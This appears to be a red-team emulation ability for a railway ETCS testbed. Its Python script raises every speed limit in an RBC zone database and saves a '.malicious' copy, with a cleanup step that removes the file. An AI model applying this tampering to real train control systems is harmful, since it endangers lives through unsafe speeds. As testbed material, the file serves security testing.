---
id: 5e6f7g8h-9i0j-1k2l-3m4n-5o6p7q8r9s0t
name: ETCS Database Manipulation
description: Modify RBC zone database to change speed limits
tactic: impact
technique:
  attack_id: T0836
  name: Modify Parameter
platforms:
  linux:
    sh:
      command: |
        python3 << 'EOF'
        import json

        db_path = "#{etcs.rbc_db_path}"
        
        try:
            with open(db_path, 'r') as f:
                db = json.load(f)
            
            # Increase all speed limits by 100 km/h
            for zone in db.get('zones', []):
                zone['speed_limit'] += #{etcs.speed_increase}
            
            with open(db_path + '.malicious', 'w') as f:
                json.dump(db, f, indent=2)
            
            print(f"[SUCCESS] Created modified database with increased speed limits")
        except Exception as e:
            print(f"[FAILED] {e}")
        EOF
      parsers:
        plugins.etcs_testbed.app.parsers.etcs_result:
          - source: etcs.db_modified
      cleanup:
        - rm -f "#{etcs.rbc_db_path}.malicious"
      payloads: []
requirements:
  - plugins.etcs_testbed.app.requirements.etcs_rbc_access:
      - source: etcs.rbc_db_path
access:
  - red
